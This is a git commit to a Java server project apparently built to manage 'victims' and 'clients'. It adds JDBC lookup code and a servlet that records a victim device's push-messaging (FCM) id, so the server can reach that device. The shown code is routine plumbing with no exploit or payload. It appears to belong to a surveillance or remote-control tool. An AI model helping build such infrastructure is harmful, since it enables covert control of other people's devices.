74e1f6b66d736b150b9868d0a29c4363300534ae
theapache64@charlie <theapache64@gmail.com>
2016-09-12 12:55:01 +0530

    Connecting victim to client

--- server/src/com/theah64/xrob/api/database/tables/Clients.java
+++ server/src/com/theah64/xrob/api/database/tables/Clients.java
@@ -1,11 +1,76 @@
 package com.theah64.xrob.api.database.tables;
 
+import com.theah64.xrob.api.database.Connection;
 import com.theah64.xrob.api.models.Client;
+
+import java.sql.PreparedStatement;
+import java.sql.ResultSet;
+import java.sql.SQLException;
 
 /**
  * Created by theapache64 on 11/9/16,2:06 PM.
  */
 public class Clients extends BaseTable<Client> {
-
     public static final String COLUMN_CLIENT_CODE = "client_code";
+
+    private Clients() {
+    }
+
+    private static final Clients instance = new Clients();
+
+    public static Clients getInstance() {
+        return instance;
+    }
+
+    @Override
+    public String get(String byColumn, String byValues, String columnToReturn) {
+        String valueToReturn = null;
+        final String query = String.format("SELECT %s FROM clients WHERE %s = ? LIMIT 1", columnToReturn, byColumn);
+        final java.sql.Connection con = Connection.getConnection();
+        try {
+            final PreparedStatement ps = con.prepareStatement(query);
+            ps.setString(1, byValues);
+            final ResultSet rs = ps.executeQuery();
+            if (rs.first()) {
+                valueToReturn = rs.getString(columnToReturn);
+            }
+            rs.close();
+            ps.close();
+
+        } catch (SQLException e) {
+            e.printStackTrace();
+        } finally {
+            try {
+                con.close();
+            } catch (SQLException e) {
+                e.printStackTrace();
+            }
+        }
+        return valueToReturn;
+    }
+
+    @Override
+    protected boolean isExist(Client client) {
+        boolean isExist = false;
+        final String query = "SELECT id FROM clients WHERE client_code = ? LIMIT 1";
+        final java.sql.Connection con = Connection.getConnection();
+        try {
+            final PreparedStatement ps = con.prepareStatement(query);
+            ps.setString(1, client.getClientCode());
+            final ResultSet rs = ps.executeQuery();
+            isExist = rs.first();
+            rs.close();
+            ps.close();
+
+        } catch (SQLException e) {
+            e.printStackTrace();
+        } finally {
+            try {
+                con.close();
+            } catch (SQLException e) {
+                e.printStackTrace();
+            }
+        }
+        return isExist;
+    }
 }
--- server/src/com/theah64/xrob/api/servlets/FCMUpdateServlet.java
+++ server/src/com/theah64/xrob/api/servlets/FCMUpdateServlet.java
@@ -2,6 +2,9 @@ package com.theah64.xrob.api.servlets;
 
 import com.theah64.xrob.api.database.tables.Victims;
 import com.theah64.xrob.api.models.Victim;
+import com.theah64.xrob.api.utils.APIResponse;
+import com.theah64.xrob.api.utils.HeaderSecurity;
+import com.theah64.xrob.api.utils.Request;
 
 import javax.servlet.ServletException;
 import javax.servlet.annotation.WebServlet;
@@ -9,11 +12,12 @@ import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
+import java.io.PrintWriter;
 
 /**
  * Created by theapache64 on 12/9/16.
  */
-@WebServlet(urlPatterns = {BaseServlet.VERSION_CODE + "/update/fcm"}, name = "FCMUpdateServlet")
+@WebServlet(urlPatterns = {BaseServlet.VERSION_CODE + "/update/fcm"})
 public class FCMUpdateServlet extends BaseServlet {
 
     private final String[] REQUIRED_PARAMS = {Victims.COLUMN_FCM_ID};
@@ -21,6 +25,29 @@ public class FCMUpdateServlet extends BaseServlet {
     protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
         response.setContentType(CONTENT_TYPE_JSON);
 
+        final PrintWriter out = response.getWriter();
+
+        try {
+            HeaderSecurity hs = new HeaderSecurity(request.getHeader(HeaderSecurity.KEY_AUTHORIZATION));
+            final Request fcmUpdateRequest = new Request(request, REQUIRED_PARAMS);
+            final String fcmId = fcmUpdateRequest.getStringParameter(Victims.COLUMN_FCM_ID);
+            final String victimId = hs.getVictimId();
+
+            final boolean isUpdated = Victims.getInstance().update(Victims.COLUMN_ID, victimId, Victims.COLUMN_FCM_ID, fcmId);
+
+            if (isUpdated) {
+                out.write(new APIResponse("success", null).getResponse());
+            } else {
+                throw new RuntimeException("Failed to update the FCM id");
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+            out.write(new APIResponse(e.getMessage()).getResponse());
+        }
+
+        out.flush();
+        out.close();
 
     }
 
